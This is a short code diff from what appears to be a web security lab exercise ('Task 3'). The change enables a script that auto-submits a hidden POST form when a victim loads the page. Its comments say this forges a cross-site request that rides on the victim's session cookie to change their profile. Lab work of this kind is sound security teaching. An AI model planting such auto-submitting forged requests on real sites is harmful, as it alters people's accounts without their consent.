@@ -24,8 +24,10 @@
     </form>
 
     <script>
-        // Uncomment to test automatic POST submission:
-        // document.getElementById('csrf-post-form').submit();
+        // Task 3: Auto-submit the hidden POST form when victim visits this page.
+        // This simulates a CSRF POST attack — the browser sends the victim's session
+        // cookie along with the forged request, updating their profile without consent.
+        document.getElementById('csrf-post-form').submit();
     </script>
 </div>
 </body>
